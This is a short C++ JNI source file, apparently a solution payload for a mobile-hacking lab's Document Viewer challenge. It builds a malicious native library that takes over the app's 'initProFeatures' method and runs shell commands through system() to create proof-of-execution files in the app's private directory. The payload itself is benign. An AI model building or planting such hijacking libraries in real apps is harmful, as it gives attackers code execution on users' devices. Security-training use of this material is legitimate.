#include <jni.h>
#include <android/log.h>
#include <stdlib.h>

#define LOG_TAG "docviewer_pro"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

extern "C"
JNIEXPORT void JNICALL
Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures(JNIEnv* env, jobject thiz) {
    __android_log_print(ANDROID_LOG_INFO, "INERSIN", "Malicious SO is being loaded");
    system("touch /data/data/com.mobilehackinglab.documentviewer/files/inersin");
    system("touch /data/data/com.mobilehackinglab.documentviewer/files/rce.txt");
}